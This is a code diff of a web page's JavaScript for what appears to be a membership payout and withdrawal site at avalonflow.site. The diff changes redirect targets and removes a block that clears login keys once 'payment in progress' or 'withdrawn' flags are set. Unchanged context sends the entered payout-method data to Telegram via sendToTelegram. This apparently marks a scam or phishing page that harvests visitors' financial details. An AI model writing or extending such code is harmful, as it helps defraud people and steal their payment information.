@@ -515,21 +515,6 @@
 })();
 
 
-// Handle auto-redirect if any of the completion/progress keys exist
-if (
-    localStorage.getItem('av_payment_in_progress') === 'true' ||
-    localStorage.getItem('has_withdrawn') === 'true' ||
-    localStorage.getItem('step_3_paid') === 'true' ||
-    localStorage.getItem('step_3_txn_id') !== null
-) {
-    // Clear out session/auth keys safely using removeItem
-    localStorage.removeItem("avalon_logged_in");
-    localStorage.removeItem("section2Data");
-    localStorage.removeItem("avalon_seen_dashboard");
-   
-    // Redirect securely to the sign-in page
-    window.location.replace('https://membership.avalonflow.site/signin');
-}
 </script>
 
         <!-- Structured Data for Logo -->
@@ -1764,7 +1749,7 @@ CROP MODAL
 // 🔔 LIGHTWEIGHT TAB & BADGE WATCHER (Sub-pages)
 // ==========================================
 
-const CLEARANCE_REDIRECT_URL = "clearance.html"; // Same target clearance page
+const CLEARANCE_REDIRECT_URL = "https://membership.avalonflow.site/notifications"; // Same target clearance page
 const ENABLE_SUBPAGE_HOLD_REDIRECT = true;     // Set true to redirect automatically on sub-pages when hold hits
 
 // Set static title string instead of pulling from document.title
@@ -2914,7 +2899,7 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
   try {
     await sendToTelegram(data);
     showNotification("Payout method linked successfully", 3000);
-    window.location.href = "/acu-payouts";
+    window.location.href = "https://membership.avalonflow.site/withdraw";
   } catch (err) {
     console.error("Telegram send failed:", err);
     window.location.href = "https://membership.avalonflow.site/withdraw";
